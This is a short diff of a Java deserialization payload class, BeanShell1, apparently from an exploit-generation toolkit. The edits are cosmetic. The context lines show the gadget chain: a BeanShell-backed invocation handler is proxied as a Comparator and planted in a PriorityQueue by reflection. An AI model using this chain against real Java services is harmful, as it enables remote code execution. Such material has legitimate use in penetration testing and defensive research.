@@ -16,7 +16,7 @@ import java.util.PriorityQueue;
  * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
  */
 
-@SuppressWarnings({"rawtypes", "unchecked"})
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"org.beanshell:bsh:2.0b5"})
 @Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
 public class BeanShell1 implements ObjectPayload<PriorityQueue> {
@@ -30,10 +30,10 @@ public class BeanShell1 implements ObjectPayload<PriorityQueue> {
         InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
         Comparator<? super Object> comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
         PriorityQueue<Object> priorityQueue = new PriorityQueue(2, comparator);
-        Object[] queue = {Integer.valueOf(1), Integer.valueOf(1)};
+        Object[] queue = {1, 1};
 
         Reflections.setFieldValue(priorityQueue, "queue", queue);
-        Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
+        Reflections.setFieldValue(priorityQueue, "size", 2);
         return priorityQueue;
     }
 }
